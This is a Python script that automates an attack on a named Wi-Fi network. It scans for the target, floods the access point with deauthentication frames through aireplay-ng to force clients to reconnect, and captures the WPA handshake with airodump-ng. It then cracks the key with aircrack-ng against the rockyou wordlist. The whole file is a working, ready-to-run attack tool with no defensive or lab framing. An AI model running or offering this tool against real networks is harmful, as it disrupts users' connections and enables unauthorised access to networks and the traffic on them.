import argparse
import logging
import threading
import subprocess
import time
import os
import signal
from pathlib import Path
import glob
import csv

def print_program_args(args):
    # Log what we're doing
    logging.info("target: %s", args.target)
    logging.info("interface: %s", args.interface)
    logging.info("capture file: %s", args.capfile)

def print_network_info(info: dict):
    print("\nFound Target Network:\n" + "-"*30)
    for key, value in info.items():
        print(f"{key:<15}: {value}")
    print('\n')

def get_latest_output_file(basename: str) -> str | None:
    pattern = f"{basename}-*.cap"
    files = glob.glob(pattern)
    if not files:
        return None
    # Sort files by creation time (newest last)
    latest_file = max(files, key=os.path.getctime)
    return latest_file

def run_aircrack(capfile: str) -> subprocess.CompletedProcess:
    logging.info("running aircrack-ng")

    full_capfile_name = get_latest_output_file(capfile)
    if not full_capfile_name:
        logging.error("Could not find capture file matching '{capfile}'")
        return subprocess.CompletedProcess(args=[], returncode=1)

    # TODO: make it so the path to the word list is a command line arg, if not provided default to rockyou.txt
    cmd = ["sudo", "aircrack-ng", full_capfile_name, "-w", "/usr/share/wordlists/rockyou.txt"]

    return subprocess.run(cmd, check=True)

def put_interface_in_same_channel(iface: str, channel: str):
    logging.info("putting interface in channel %s", channel)

    cmd = ["sudo", "airmon-ng", "stop", iface]
    subprocess.run(cmd, capture_output=True, text=True)
    
    cmd = ["sudo", "airmon-ng", "start", iface, channel]
    subprocess.run(cmd, capture_output=True, text=True)
    
def start_airodump(airodump_args, stop_event):
    logging.info("starting airodump")
    cmd = [
        "sudo", "airodump-ng", "-w", airodump_args["cap_file_name"],
        "-c", str(airodump_args["channel"]), "--bssid", airodump_args["BSSID"],
        airodump_args["interface"]
    ]

    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    while not stop_event.is_set():
        time.sleep(0.5)
    proc.terminate()
    proc.wait()

def send_deauths(aireplay_args, stop_event, channel):
    put_interface_in_same_channel(aireplay_args["interface"], channel)
    
    cmd = [
        "sudo", "aireplay-ng", "--deauth", str(aireplay_args["deauths"]),
        "-a", aireplay_args["BSSID"], aireplay_args["interface"]
    ]
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    while not stop_event.is_set():
        if proc.poll() is not None:
            break  # command finished
        time.sleep(0.5)

    if proc.poll() is None:
        logging.info("stopping aireplay-ng")
        proc.terminate()
        proc.wait()

def kill_conflicting_processes():
    subprocess.run(["sudo", "airmon-ng", "check", "kill"], capture_output=True, text=True, check=True)

def enable_monitor_mode(iface: str) -> str:
    """
    Enable monitor mode on *iface* using airmon‑ng and
    return the resulting monitor‑mode interface name.

    If the interface is already in monitor mode (ends with 'mon'), it is returned unchanged.
    """
    if iface.endswith("mon"):
        return iface  # already monitor mode

    cmd = ["sudo", "airmon-ng", "start", iface]
    logging.info("[*] Enabling monitor mode")
    subprocess.run(cmd, capture_output=True, text=True, check=True)

def clean_up_network_info(network_info: dict) -> dict:
    for key in network_info:
        network_info[key] = network_info[key].strip()
    return network_info;

def find_network_info_by_essid(essid: str, interface: str = "wlan0mon", timeout: int = 30) -> dict | None:
    """
    Runs airodump-ng on given interface, watches CSV output for a network matching the ESSID.
    Returns all network info as a dict once found, or None on timeout.
    """

    output_prefix = "./airodump_capture"  # no .csv here
    csv_path = Path(f"{output_prefix}-01.csv")
    
    # Start airodump-ng with CSV output
    proc = subprocess.Popen(
        ["sudo", "airodump-ng", interface, "--write", output_prefix, "--output-format", "csv"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    try:
        start_time = time.time()

        while time.time() - start_time < timeout:
            if not csv_path.exists():
                time.sleep(0.5)
                continue

            with open(csv_path, newline="", encoding="utf-8", errors="ignore") as csvfile:
                reader = csv.reader(csvfile)
                # airodump-ng CSV has a header, followed by data, then a blank line, then stations section
                # We'll read until the blank line which indicates end of networks table

                for row in reader:
                    if len(row) == 0:
                        # blank line -> end of networks section
                        continue
                    # skip header row by checking for known header string or length
                    if row[0] == "BSSID" or len(row) < 14:
                        continue

                    # ESSID is typically last column
                    ESSID_COL = 13
                    row_essid = row[ESSID_COL].strip()
                    if row_essid == essid:
                        # Map header names to values (hardcoded columns per airodump-ng CSV format)
                        keys = [
                            "BSSID", "First time seen", "Last time seen", "channel", "Speed", "Privacy",
                            "Cipher", "Authentication", "Power", "Beacons", "IV", "LAN IP", "ID-length", "ESSID", "Key"
                        ]

                        network_info = dict(zip(keys, row))
                        network_info = clean_up_network_info(network_info)
                        return network_info

            time.sleep(0.5)

    finally:
        proc.send_signal(signal.SIGINT)
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()

        if csv_path.exists():
            csv_path.unlink()  # clean up CSV file

        # also remove other airodump-ng generated files if you want
        for ext in ["-01.kismet.csv", "-01.kismet.netxml", "-01.kismet.wigle.xml"]:
            f = Path(f"{output_prefix}{ext}")
            if f.exists():
                f.unlink()

    return None

def main():
    # Create argument parser
    parser = argparse.ArgumentParser(
        description="Wi-Fi target capture tool using airodump-ng"
    )

    # Add named (optional-looking but required) arguments
    parser.add_argument("--target", required=True, help="Target network ESSID (e.g., 'MyWiFi')")
    parser.add_argument("--interface", required=True, help="Wireless interface in monitor mode (e.g., wlan0mon)")
    parser.add_argument("--capfile", required=True, help="Output capture file prefix (e.g., 'output-file')")

    # Parse the arguments and log what we're doing
    args = parser.parse_args()
    print_program_args(args)

    # Kill any processes that could cause interference and put adapter in monitor mode
    kill_conflicting_processes()
    enable_monitor_mode(args.interface)

    network_info = find_network_info_by_essid(args.target, args.interface)

    if network_info:
        print_network_info(network_info)

        aireplay_stop_event = threading.Event()
        airodump_stop_event = threading.Event()
        
        # In its own thread, send 60 deauths by default TODO: make this value a command line arg
        aireplay_args = { "interface": args.interface, "BSSID": network_info["BSSID"], "deauths": "60" }
        
        # In second thread, capture the automatic reauthentication attempt
        airodump_args = { "cap_file_name": args.capfile, "channel": network_info["channel"], "BSSID": network_info["BSSID"], "interface": args.interface }

        deauth_thread = threading.Thread(target=send_deauths, args=(aireplay_args, aireplay_stop_event, network_info["channel"]))
        airodump_thread = threading.Thread(target=start_airodump, args=(airodump_args, airodump_stop_event))

        airodump_thread.start()
        deauth_thread.start()

        time.sleep(30)
        aireplay_stop_event.set()
        airodump_stop_event.set()

        deauth_thread.join()
        airodump_thread.join()

        output = run_aircrack(args.capfile)
        logging.info(output)

        logging.info("program complete")

if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format='[%(asctime)s] %(levelname)s: %(message)s',
        datefmt='%H:%M:%S'
    )
    try:
        main()
    except KeyboardInterrupt:
        logging.info("user interrupted, exiting …")
    except Exception as e:
        logging.error("error: %s", e)
